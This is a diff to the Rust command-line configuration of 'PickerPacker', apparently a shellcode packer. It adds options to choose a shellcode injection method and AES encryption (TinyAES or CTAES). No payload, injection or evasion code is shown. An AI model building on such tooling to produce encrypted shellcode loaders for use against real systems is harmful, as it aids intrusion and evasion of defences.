@@ -28,6 +28,50 @@ impl ExecutionMethod {
     }
 }
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
+pub enum InjectionMethod {
+    #[value(name = "default")]
+    Default,
+}
+
+impl InjectionMethod {
+    pub fn feature_name(&self) -> &'static str {
+        match self {
+            InjectionMethod::Default => "InjectionDefaultLocal",
+        }
+    }
+
+    pub fn display_name(&self) -> &'static str {
+        match self {
+            InjectionMethod::Default => "Default Local Injection",
+        }
+    }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
+pub enum EncryptionMethod {
+    #[value(name = "tinyaes")]
+    TinyAES,
+    #[value(name = "ctaes")]
+    CTAES,
+}
+
+impl EncryptionMethod {
+    pub fn feature_name(&self) -> &'static str {
+        match self {
+            EncryptionMethod::TinyAES => "TinyAES",
+            EncryptionMethod::CTAES => "CTAES",
+        }
+    }
+
+    pub fn display_name(&self) -> &'static str {
+        match self {
+            EncryptionMethod::TinyAES => "TinyAES Encryption",
+            EncryptionMethod::CTAES => "CTAES Encryption",
+        }
+    }
+}
+
 #[derive(Parser, Debug)]
 #[command(
     name = "PickerPacker",
@@ -45,6 +89,14 @@ pub struct PackerConfig {
     #[arg(long, value_enum, default_value = "default")]
     pub execution_method: ExecutionMethod,
 
+    /// Shellcode injection method to use
+    #[arg(long, value_enum, default_value = "default")]
+    pub injection_method: InjectionMethod,
+
+    /// Encryption method to use (optional)
+    #[arg(long, value_enum)]
+    pub encrypt: Option<EncryptionMethod>,
+
     /// Enable MessageBox feature in loader
     #[arg(long)]
     pub message_box: bool,
@@ -53,19 +105,11 @@ pub struct PackerConfig {
     #[arg(long)]
     pub random_calculation: bool,
 
-    /// Enable TinyAES encryption
-    #[arg(long)]
-    pub tinyaes: bool,
-
-    /// Enable CTAES encryption
-    #[arg(long)]
-    pub ctaes: bool,
-
     /// AES encryption key (64 hex characters / 32 bytes)
     #[arg(
         long,
         value_name = "HEX",
-        required_if_eq_any([("tinyaes", "true"), ("ctaes", "true")]),
+        required_if_eq_any([("encrypt", "tinyaes"), ("encrypt", "ctaes")]),
         value_parser = validate_aes_key
     )]
     pub key: Option<String>,
@@ -74,7 +118,7 @@ pub struct PackerConfig {
     #[arg(
         long,
         value_name = "HEX",
-        required_if_eq_any([("tinyaes", "true"), ("ctaes", "true")]),
+        required_if_eq_any([("encrypt", "tinyaes"), ("encrypt", "ctaes")]),
         value_parser = validate_aes_iv
     )]
     pub iv: Option<String>,
